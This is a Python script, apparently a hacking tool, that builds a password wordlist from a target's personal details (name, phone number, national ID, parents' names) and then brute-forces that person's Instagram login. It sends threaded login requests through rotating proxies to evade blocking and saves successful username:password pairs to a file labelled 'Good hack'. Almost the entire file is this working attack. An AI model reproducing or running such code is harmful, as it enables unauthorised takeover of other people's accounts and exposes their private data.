from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
import json
from colorama import Fore
CheckVersion = str(sys.version)
import re
from datetime import datetime



print("""         .   ,
       '. '.  \  \
      ._ '-.'. `\  \
        '-._; .'; `-.'. 
       `~-.; '.       '.
        '--,`           '.
           -='.          ;
 .--=~~=-,    -.;        ;
 .-=`;    `~,_.;        /
`  ,-`'    .-;         |
   .-~`.    .;         ;
    .;.-   .-;         ,\
      `.'   ,=;     .-'  `~.-._
       .';   .';  .'      .'   '-.
         .\  ;  ;        ,.' _  a',
        .'~";-`   ;      ;"~` `'-=.)
      .' .'   . _;  ;',  ;
      '-.._`~`.'  \  ; ; :
           `~'    _'\\_ \\_ 
                 /=`^^=`""/`)-.
            GHOST \ =  _ =     =\
                  `""` `~-. =   ;""")

print("""
▒█▀▀█ ▒█░▒█ ▒█▀▀▀█ ▒█▀▀▀█ ▀▀█▀▀ ▒█▀▀▀ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀█ 
▒█░▄▄ ▒█▀▀█ ▒█░░▒█ ░▀▀▀▄▄ ░▒█░░ ▒█▀▀▀ ▒█▄▄█ ▒█▄▄▀ ▒█░░▒█ ▒█░▄▄ 
▒█▄▄█ ▒█░▒█ ▒█▄▄▄█ ▒█▄▄▄█ ░▒█░░ ▒█▄▄▄ ▒█░░░ ▒█░▒█ ▒█▄▄▄█ ▒█▄▄█""")

print()
print()

password = open('password_List.txt', 'w')
listme = []

class Generate:
	def __init__(self):

		self.string = ""
		self.short = ""
		self.space = ""
		self.name = ""
		self.family = ""
		self.phone = ""
		self.point = point
		self.national_id = national_id
	def method_1(self, name, family):
		listme.append("=========METHOD 1=========")
		space = " "

		if space in name:
			name = name.replace(" ", " ")

		string = name = family + "\n"
		listme.append(string)
		string = name  + "0" + "\n"
		listme.append(string)
		string = name  + "1" + "\n"
		listme.append(string)
		string = name  + "123" + "\n"
		listme.append(string)
		string = name  + "12345" + "\n"
		listme.append(string)
		string = name  + "123456" + "\n"
		listme.append(string)
		string = name + "1122" + "\n"
		listme.append(string)
		string = name + "112233" + "\n"
		listme.append(string)
		string = name + "11223344" + "\n"
		listme.append(string)
		string = name + "1122334455" + "\n"
		listme.append(string)
		string = name + "112233445566" + "\n"
		listme.append(string)
		string = name + "11223344556677" + "\n"
		listme.append(string)
		string = name + "1122334455667788" + "\n"
		listme.append(string)
		string = name + "112233445566778899" + "\n"
		listme.append(string)
		if space in name:
			name = name.replace(" ", " ")
		if space in name:
			name = family.replace(" ", " ")

		string = family + name +"\n"
		listme.append(string)
		string = family + "0" + "\n"
		listme.append(string)
		string = family + "1" + "\n"
		listme.append(string)
		string = family + "123" + "\n"
		listme.append(string)
		string = family + "12345" + "\n"
		listme.append(string)
		string = family + "123456" + "\n"
		listme.append(string)
		string = family + "123456789" + "\n"
		listme.append(string)
		string = family + "@" + "\n"
		listme.append(string)
		string = family + "%" + "\n"
		listme.append(string)
		string = family + "&" + "\n"
		listme.append(string)
		string = family + "*" + "\n"
		listme.append(string)
		string = family + "1122" + "\n"
		listme.append(string)
		string = family + "112233" + "\n"
		listme.append(string)
		string = family + "11223344" + "\n"
		listme.append(string)
		string = family + "1122334455" + "\n"
		listme.append(string)
		string = family + "1122335566" + "\n"
		listme.append(string)
		string = family + "1122344556677" + "\n"
		listme.append(string)
		string = family + "1122334455667788" + "\n"
		listme.append(string)
		string = family + "112233445566" + "\n"
		listme.append(string)

		string = name + " " + family
		if space in string:
			ll = string.split(" ")
			for j in ll:
				self.short += j[0]

		string = self.short + "0" + "\n"
		listme.append(string)
		string = self.short + "1" + "\n"
		listme.append(string)
		string = self.short + "123" + "\n"
		listme.append(string)
		string = self.short + "12345" + "\n"
		listme.append(string)
		string = self.short + "123456" + "\n"
		listme.append(string)
		string = self.short + "123456789" + "\n"
		listme.append(string)
		string = self.short + "%" + "\n"
		listme.append(string)
		string = self.short + "*" + "\n"
		listme.append(string)
		string = self.short + "&" + "\n"
		listme.append(string)
		string = self.short + "123456789" + "\n"
		listme.append(string)
		string = self.short + "1122" + "\n"
		listme.append(string)
		string = self.short + "112233" + "\n"
		listme.append(string)
		string = self.short + "11223344" + "\n"
		listme.append(string)
		string = self.short + "112234455" + "\n"
		listme.append(string)
		string = self.short + "112233445566" + "\n"
		listme.append(string)
		string = self.short + "11223344577" + "\n"
		listme.append(string)
		string = self.short + "11667788" + "\n"
		listme.append(string)
		string = self.short + "11223344556" + "\n"
		listme.append(string)
	def method_2(self, name, phone):
		listme.append("==========METHOD 2==========\n")
		space = " "

		if space in name:
			name = name.replace(" ", " ")

			for i in range(11):
				string = name + phone[i:] + "\n"
				listme.append(string)
			for j in range(11):
				string = name + family + phone[j:] + "\n"
				listme.append(string)


	def method_3(self, name, family, phone):
		listme.append("=========METHOD 3=========\n")
		string = name + " " + family
		space = " "
		self.short = ""
		if space in string:
			ll = string.split(" ")
			for j in ll:
				self.short += j[0]

		for i in range(11):
			string = self.short + phone[i:] + "\n"
			listme.append(string)
			if len(string) <= 3:
				break

	def method_4(self, name, national_id):
		listme.append("=========METHOD 4=========\n")
		space = " "
		if space in name:
			name  = name.replace(" "," ")

		for i in range(10):
			string = name + national_id[i:] + "\n"
			listme.append(string)
			if len(string) <= 3:
				break

	def method_5(self, name, family, national_id):
		listme.append("=========METHOD 5=========\n")
		space = " "
		if space in name:
			name = name.replace(" ", " ")

		string  = name + family + national_id + "\n"
		listme.append(string)
		string = name + " " + family + national_id + "\n"
		space = " "
		self.short = ""
		if space in string:
			ll = string.split(" ")
			for j in ll:
				self.short += j[0]
		string = self.short = national_id + "\n"
		listme.append(string)
		for i in range(10):
			string = self.short + national_id[i:] + "\n"
			listme.append(string)

	def method_6(self, point, phone):
		listme.append("=========METHOD 6=========\n")

		for i in range(11):
			string = point = phone[i:] + "\n"
			listme.append(string)

	def method_7(self, point):
		listme.append("=========METHOD 7=========\n")

		string = point + "1" + "\n"
		listme.append(string)
		string = point + "0" + "\n"
		listme.append(string)
		string = point + "123" + "\n"
		listme.append(string)
		string = point + "12345" + "\n"
		listme.append(string)
		string = point + "123456" + "\n"
		listme.append(string)
		string = point + "123456789" + "\n"
		listme.append(string)
		string = point + "1122" + "\n"
		listme.append(string)
		string = point + "112233" + "\n"
		listme.append(string)
		string = point + "11223344" + "\n"
		listme.append(string)
		string = point + "1122334455" + "\n"
		listme.append(string)
		string = point + "112233445566" + "\n"
		listme.append(string)
		string = point + "112236677" + "\n"
		listme.append(string)
		string = point + "122334455667788" + "\n"
		listme.append(string)
		string = point + "1122334455667" + "\n"
		listme.append(string)

	def method_8(self, name, family, date):
		listme.append("=========METHOD 8=========\n")

		string = name + date + "\n"
		listme.append(string)
		string = name + date[2:] + "\n"
		listme.append(string)

		space = " "
		if space in string:
			ll = string.split(" ")
			string = ll[0] + date + "\n"
			listme.append(string)
			string = ll[1] + date + "\n"
			listme.append(string)
		string = name + family + date + "\n"
		listme.append(string)

	def method_9(self, name, national_id):
		listme.append("=========METHOD 9=========\n")\

		string = name + national_id

		space = " "
		if space in string:
			ll = string.split(" ")
			string = ll[0] + national_id + "\n"
			listme.append(string)
			string = ll[1] + "\n"
			listme.append(string)

	def method_10(self, name, national_id):
		listme.append("=========METHOD 10=========\n")

		for i in range(11):
			string = phone[i:] + "\n"
			listme.append(string)
			if len(phone[i:]) <= 5:
				break
		for j in range(10):
			string = national_id[j:] + "\n"
			listme.append(string)
			if len(national_id[j:]) <= 5:
				break
	def method_11(self, name, phone, date, national_id):
		listme.append("=========METHOD 11=========\n")

		for i in range(4):
			for j in range(11):
				string = name[:i + 1] + phone[j:] + "\n"
				listme.append(string)

		for i in range(4):
			for j in range(10):
				string = name[:i + 1] + national_id[j:] + "\n"
				listme.append(string)

		for i in range(4):
			for j in range(4):
				string = name[:i + 1] + date[j:] + "\n"
				listme.append(string)

	def method_20(self, name):
		listme.append("=========METHOD 20=========\n")
		for k in range(1, 10000):
			for i in range(4):
				if len(str(k)) == 1:
					k = str(k)
					k = "0" + "0" + "0" + k
				if len(str(k)) == 2:
					k = str(k)
					k = "0" + "0" + k
				if len(str(k)) == 3:
					k = str(k)
					k = "0" + k
				string = name[:i + 1] + str(k) + "\n"
				if len(string) != 8:
					listme.append(string)
			string = name = str(k) + "\n"
			listme.append(string)

family = input(str("[+] Name : "))
name = input(str("[+] Family : "))
phone = input(str("[+] Phone Number : "))
national_id = input(str("[+] national_id : "))
point = input(str("[+] Mother_Name : "))
date = input(str("[+] Fother_Name : "))
# Pet = input(str("[+] Pet Name : "))

name = name.lower()
family = family.lower()
point = point.lower()
objective = Generate()

if national_id == '0':
	objective.method_1(name, family)
	objective.method_2(name, phone)
	objective.method_3(name, family, phone)
	objective.method_4(name, national_id)
	objective.method_5(name, family, national_id)
	objective.method_6(point, phone)
	objective.method_7(point)
	objective.method_8(name,family, date)
	objective.method_9(name, national_id)
	objective.method_10(phone, national_id)
	objective.method_11(name, phone, date, national_id)
	if phone == '0':
		objective.method_1(name, family)
		objective.method_2(name, phone)
		objective.method_3(name, family, phone)
		objective.method_4(name, national_id)
		objective.method_5(name, family, national_id)
		objective.method_6(point, phone)
		objective.method_7(point)
		objective.method_8(name,family, date)
		objective.method_9(name, national_id)
		objective.method_10(phone, national_id)
		objective.method_11(name, phone, date, national_id)
else:

		objective.method_1(name, family)
		objective.method_2(name, phone)
		objective.method_3(name, family, phone)
		objective.method_4(name, national_id)
		objective.method_5(name, family, national_id)
		objective.method_6(point, phone)
		objective.method_7(point)
		objective.method_8(name,family, date)
		objective.method_9(name, national_id)
		objective.method_10(phone, national_id)
		objective.method_11(name, phone, date, national_id)
		objective.method_20(name)

i = len(listme) - 1
while i >= 0:
	if (len(listme[i]) < 7 or len(listme[i]) > 36):
		del listme[i]
	i -= 1
print(len(listme), "Creact Password :)")
for writing in listme:
	password.write(writing)

password.close()


print("==============================================")
print()


normal_color = "\33[00m"
info_color = "\033[1;33m"
red_color = "\033[1;31m"
green_color = "\033[1;32m"
whiteB_color = "\033[1;37m"
detect_color = "\033[1;34m"
banner_color="\033[1;33;40m"
end_banner_color="\33[00m"
onlyPasswords = False






class InstaBrute(object):
    def __init__(self):

        try:
            user = input('username : ')
            Combo = input('passList : ')
            self.CurrentProxy = ''
            self.UsedProxys = []
            UsePorxy = input('[*] Do you want to use proxy (y/n): ').upper()
            if (UsePorxy == 'Y' or UsePorxy == 'YES'):
                self.randomProxy()

            print('\n----------------------------')

        except:
            print(' The tool was arrested exit ')
            sys.exit()

        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
        for j in thread:
            j.join()

    def randomProxy(self):
        plist = open('proxy.txt').read().splitlines()
        proxy = random.choice(plist)

        if not proxy in self.UsedProxys:
            self.CurrentProxy = proxy
            self.UsedProxys.append(proxy)
        while 1:
            try:
                print('')
                print(normal_color+'[*] Check new ip...')
                response = requests.get('https://api.ipify.org/?format=raw', proxies={"http": proxy, "https": proxy},
                                        timeout=10.0).text
                if re.match(r'((?:\d{1,3}\.){3}\d{1,3})', response) != None:
                    print(whiteB_color + '[*] Your public ip: %s' % response)
                    print('')
                    break
                else:
                    continue
                # if response.rtrim().ltrim() == "HTTP/1.1 400 Bad Request":
                #     raise Exception("Can not reach proxy")
                # else:
                #     break
            except Exception as e:
                print('[*] Can\'t reach proxy "%s"' % proxy)
                proxy = random.choice(plist)

            print('')


    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
            })


            data = json.loads(r.text)
            if 'message' in r.text:
                print('----------------------------')
                print(red_color+'--> not proxy :(')
                UsePorxy = self.randomProxy()
                print (whiteB_color + 'username: '+ user + ' | '' password: '+ pwd )
                print(r.text)
                print('----------------------------')
            if 'checkpoint_url' in r.text:
                print((normal_color+'' + user + ':' + pwd + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
                    exit()
            if 'userId' in r.text:
                print((normal_color+'' + user + ':' + pwd + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
                    exit()
            elif 'status' in r.text:
                print (red_color + 'username: '+ user + ' | '' password: '+ pwd )
                print(r.text)
InstaBrute()
